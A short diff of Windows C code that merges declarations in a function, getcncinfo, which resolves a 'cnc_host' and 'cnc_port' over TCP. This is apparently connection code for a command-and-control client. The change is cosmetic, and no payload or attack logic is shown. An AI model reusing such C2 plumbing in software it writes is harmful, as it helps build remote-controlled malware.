@@ -22,10 +22,9 @@ void initwinsock() {
 
 struct addrinfo getcncinfo() {
   int res;
-  struct addrinfo *result = NULL;
-  struct addrinfo hints = {.ai_family = AF_UNSPEC,
-                           .ai_socktype = SOCK_STREAM,
-                           .ai_protocol = IPPROTO_TCP};
+  struct addrinfo *result = NULL, hints = {.ai_family = AF_UNSPEC,
+                                           .ai_socktype = SOCK_STREAM,
+                                           .ai_protocol = IPPROTO_TCP};
   res = getaddrinfo(cnc_host, cnc_port, &hints, &result);
   if (res != 0) {
     printf("getaddrinfo failed: %d\n", res);
